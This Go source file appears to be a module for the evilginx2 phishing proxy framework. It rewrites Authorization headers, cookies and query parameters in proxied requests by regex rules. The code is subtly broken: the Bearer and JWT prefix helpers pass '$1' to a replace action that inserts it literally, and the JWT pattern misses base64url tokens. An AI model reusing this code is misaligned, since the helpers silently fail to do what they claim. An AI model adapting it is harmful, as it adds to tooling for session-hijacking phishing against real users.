package core

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

// TokenRule defines a token modification rule
type TokenRule struct {
	Pattern     *regexp.Regexp // Pattern to match tokens (e.g., JWT, Bearer)
	Action      string         // Action: "replace", "prefix", "suffix", "remove"
	Value       string         // Value to use for replacement/prefix/suffix
	Description string         // Human readable description
	Enabled     bool           // Whether this rule is enabled
}

// TokenLocation represents where tokens can be found
type TokenLocation string

const (
	TokenLocationHeader     TokenLocation = "header"
	TokenLocationCookie     TokenLocation = "cookie"
	TokenLocationQueryParam TokenLocation = "query"
	TokenLocationBody       TokenLocation = "body"
)

// TokenModifier handles token modification in requests
type TokenModifier struct {
	rules           []TokenRule
	headerRules     map[string][]TokenRule // Header name -> rules
	cookieRules     []TokenRule           // Rules for cookie values
	queryRules      map[string][]TokenRule // Query param -> rules
	bodyRules       []TokenRule           // Rules for request body
	globalEnabled   bool
}

// NewTokenModifier creates a new token modifier instance
func NewTokenModifier() *TokenModifier {
	tm := &TokenModifier{
		rules:         make([]TokenRule, 0),
		headerRules:   make(map[string][]TokenRule),
		cookieRules:   make([]TokenRule, 0),
		queryRules:    make(map[string][]TokenRule),
		bodyRules:     make([]TokenRule, 0),
		globalEnabled: false,
	}

	// Add default JWT and Bearer token patterns
	tm.addDefaultRules()

	return tm
}

// addDefaultRules adds commonly used token patterns
func (tm *TokenModifier) addDefaultRules() {
	// JWT token pattern (starts with ey and contains dots)
	jwtPattern := regexp.MustCompile(`^ey[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]*$`)
	
	// Bearer token pattern
	bearerPattern := regexp.MustCompile(`^Bearer\s+(.+)$`)
	
	// Basic Auth pattern
	basicPattern := regexp.MustCompile(`^Basic\s+(.+)$`)

	// Default rules (disabled by default)
	defaultRules := []TokenRule{
		{
			Pattern:     jwtPattern,
			Action:      "prefix",
			Value:       "modified_",
			Description: "Add prefix to JWT tokens",
			Enabled:     false,
		},
		{
			Pattern:     bearerPattern,
			Action:      "replace",
			Value:       "Bearer modified_token",
			Description: "Replace Bearer tokens",
			Enabled:     false,
		},
		{
			Pattern:     basicPattern,
			Action:      "prefix",
			Value:       "Basic modified_",
			Description: "Modify Basic Auth tokens",
			Enabled:     false,
		},
	}

	tm.rules = append(tm.rules, defaultRules...)
}

// Enable enables the token modifier globally
func (tm *TokenModifier) Enable() {
	tm.globalEnabled = true
	log.Info("Token modifier enabled")
}

// Disable disables the token modifier globally
func (tm *TokenModifier) Disable() {
	tm.globalEnabled = false
	log.Info("Token modifier disabled")
}

// IsEnabled returns whether token modifier is enabled
func (tm *TokenModifier) IsEnabled() bool {
	return tm.globalEnabled
}

// AddRule adds a new token modification rule
func (tm *TokenModifier) AddRule(pattern string, action string, value string, description string, location TokenLocation, target string) error {
	compiledPattern, err := regexp.Compile(pattern)
	if err != nil {
		return err
	}

	rule := TokenRule{
		Pattern:     compiledPattern,
		Action:      action,
		Value:       value,
		Description: description,
		Enabled:     true,
	}

	switch location {
	case TokenLocationHeader:
		if tm.headerRules[target] == nil {
			tm.headerRules[target] = make([]TokenRule, 0)
		}
		tm.headerRules[target] = append(tm.headerRules[target], rule)
		log.Info("Added header rule for '%s': %s", target, description)
	case TokenLocationCookie:
		tm.cookieRules = append(tm.cookieRules, rule)
		log.Info("Added cookie rule: %s", description)
	case TokenLocationQueryParam:
		if tm.queryRules[target] == nil {
			tm.queryRules[target] = make([]TokenRule, 0)
		}
		tm.queryRules[target] = append(tm.queryRules[target], rule)
		log.Info("Added query param rule for '%s': %s", target, description)
	case TokenLocationBody:
		tm.bodyRules = append(tm.bodyRules, rule)
		log.Info("Added body rule: %s", description)
	}

	return nil
}

// EnableRule enables a specific rule by description
func (tm *TokenModifier) EnableRule(description string) {
	for i := range tm.rules {
		if tm.rules[i].Description == description {
			tm.rules[i].Enabled = true
			log.Info("Enabled rule: %s", description)
			return
		}
	}
	log.Warning("Rule not found: %s", description)
}

// DisableRule disables a specific rule by description
func (tm *TokenModifier) DisableRule(description string) {
	for i := range tm.rules {
		if tm.rules[i].Description == description {
			tm.rules[i].Enabled = false
			log.Info("Disabled rule: %s", description)
			return
		}
	}
	log.Warning("Rule not found: %s", description)
}

// ModifyRequest modifies tokens in the HTTP request
func (tm *TokenModifier) ModifyRequest(req *http.Request) {
	if !tm.globalEnabled {
		return
	}

	// Modify headers
	tm.modifyHeaders(req)
	
	// Modify cookies
	tm.modifyCookies(req)
	
	// Modify query parameters
	tm.modifyQueryParams(req)
	
	// Note: Body modification would require reading and rewriting the body
	// This is more complex and should be done carefully to not break the request
}

// modifyHeaders modifies authorization and other headers
func (tm *TokenModifier) modifyHeaders(req *http.Request) {
	// Check Authorization header specifically
	if authHeader := req.Header.Get("Authorization"); authHeader != "" {
		if rules, exists := tm.headerRules["Authorization"]; exists {
			newValue := tm.applyRules(authHeader, rules)
			if newValue != authHeader {
				req.Header.Set("Authorization", newValue)
				log.Debug("Modified Authorization header")
			}
		}
		// Also check global rules
		newValue := tm.applyRules(authHeader, tm.rules)
		if newValue != authHeader {
			req.Header.Set("Authorization", newValue)
			log.Debug("Modified Authorization header with global rule")
		}
	}

	// Check all headers for configured rules
	for headerName, rules := range tm.headerRules {
		if headerName == "Authorization" {
			continue // Already handled above
		}
		if headerValue := req.Header.Get(headerName); headerValue != "" {
			newValue := tm.applyRules(headerValue, rules)
			if newValue != headerValue {
				req.Header.Set(headerName, newValue)
				log.Debug("Modified header '%s'", headerName)
			}
		}
	}
}

// modifyCookies modifies cookie values
func (tm *TokenModifier) modifyCookies(req *http.Request) {
	cookies := req.Cookies()
	modified := false

	for _, cookie := range cookies {
		newValue := tm.applyRules(cookie.Value, tm.cookieRules)
		if newValue != cookie.Value {
			cookie.Value = newValue
			modified = true
			log.Debug("Modified cookie '%s'", cookie.Name)
		}
	}

	if modified {
		// Clear existing Cookie header and set new cookies
		req.Header.Del("Cookie")
		for _, cookie := range cookies {
			req.AddCookie(cookie)
		}
	}
}

// modifyQueryParams modifies query parameters
func (tm *TokenModifier) modifyQueryParams(req *http.Request) {
	values := req.URL.Query()
	modified := false

	for paramName, rules := range tm.queryRules {
		if paramValues, exists := values[paramName]; exists {
			for i, paramValue := range paramValues {
				newValue := tm.applyRules(paramValue, rules)
				if newValue != paramValue {
					values[paramName][i] = newValue
					modified = true
					log.Debug("Modified query param '%s'", paramName)
				}
			}
		}
	}

	if modified {
		req.URL.RawQuery = values.Encode()
	}
}

// applyRules applies token modification rules to a value
func (tm *TokenModifier) applyRules(value string, rules []TokenRule) string {
	result := value

	for _, rule := range rules {
		if !rule.Enabled {
			continue
		}

		if rule.Pattern.MatchString(result) {
			switch rule.Action {
			case "replace":
				result = rule.Value
				log.Debug("Applied replace rule: %s", rule.Description)
			case "prefix":
				result = rule.Value + result
				log.Debug("Applied prefix rule: %s", rule.Description)
			case "suffix":
				result = result + rule.Value
				log.Debug("Applied suffix rule: %s", rule.Description)
			case "remove":
				result = ""
				log.Debug("Applied remove rule: %s", rule.Description)
			case "extract":
				// Extract matched groups and use first group as result
				matches := rule.Pattern.FindStringSubmatch(result)
				if len(matches) > 1 {
					result = matches[1]
					log.Debug("Applied extract rule: %s", rule.Description)
				}
			}
		}
	}

	return result
}

// ListRules returns all configured rules
func (tm *TokenModifier) ListRules() []TokenRule {
	allRules := make([]TokenRule, 0)
	
	// Add global rules
	allRules = append(allRules, tm.rules...)
	
	// Add header rules
	for headerName, rules := range tm.headerRules {
		for _, rule := range rules {
			rule.Description = rule.Description + " (Header: " + headerName + ")"
			allRules = append(allRules, rule)
		}
	}
	
	// Add cookie rules
	for _, rule := range tm.cookieRules {
		rule.Description = rule.Description + " (Cookie)"
		allRules = append(allRules, rule)
	}
	
	// Add query rules
	for paramName, rules := range tm.queryRules {
		for _, rule := range rules {
			rule.Description = rule.Description + " (Query: " + paramName + ")"
			allRules = append(allRules, rule)
		}
	}
	
	// Add body rules
	for _, rule := range tm.bodyRules {
		rule.Description = rule.Description + " (Body)"
		allRules = append(allRules, rule)
	}
	
	return allRules
}

// ClearRules removes all rules
func (tm *TokenModifier) ClearRules() {
	tm.rules = make([]TokenRule, 0)
	tm.headerRules = make(map[string][]TokenRule)
	tm.cookieRules = make([]TokenRule, 0)
	tm.queryRules = make(map[string][]TokenRule)
	tm.bodyRules = make([]TokenRule, 0)
	
	// Re-add default rules
	tm.addDefaultRules()
	
	log.Info("All token modification rules cleared")
}

// SetBearerTokenPrefix sets a prefix for Bearer tokens in Authorization header
func (tm *TokenModifier) SetBearerTokenPrefix(prefix string) error {
	return tm.AddRule(
		`^Bearer\s+(.+)$`,
		"replace",
		"Bearer "+prefix+"$1",
		"Add prefix to Bearer tokens",
		TokenLocationHeader,
		"Authorization",
	)
}

// SetJWTPrefix sets a prefix for JWT tokens
func (tm *TokenModifier) SetJWTPrefix(prefix string) error {
	return tm.AddRule(
		`^(ey[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]*)$`,
		"replace",
		prefix+"$1",
		"Add prefix to JWT tokens",
		TokenLocationHeader,
		"Authorization",
	)
}

// ReplaceTokenValue completely replaces matching tokens with a new value
func (tm *TokenModifier) ReplaceTokenValue(pattern string, newValue string, description string) error {
	return tm.AddRule(pattern, "replace", newValue, description, TokenLocationHeader, "Authorization")
}